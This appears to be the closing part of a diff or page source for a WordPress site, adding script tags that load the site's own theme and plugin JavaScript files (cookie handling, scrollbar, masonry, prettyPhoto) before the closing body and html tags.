+<script type='text/javascript' src='https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/js/jquery_cookie.js?ver=1.1'></script>
+<script type='text/javascript' src='https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/js/scrollbar/jquery.mCustomScrollbar.concat.min.js?ver=1.1'></script>
+<script type='text/javascript' src='https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/js/scrollbar/jquery.mousewheel.min.js?ver=1.1'></script>
+<script type='text/javascript' src='https://www.ciprianmarica.com/wp-includes/js/jquery/jquery.masonry.min.js?ver=2.1.05'></script>
+<script type='text/javascript' src='https://www.ciprianmarica.com/wp-content/themes/ciprianmarica/js/functions.js?ver=2013-07-18'></script>
+<script type='text/javascript' src='https://www.ciprianmarica.com/wp-content/plugins/easy-image-gallery/includes/lib/prettyphoto/jquery.prettyPhoto.js?ver=1.0.4'></script>
+</body>
+</html>
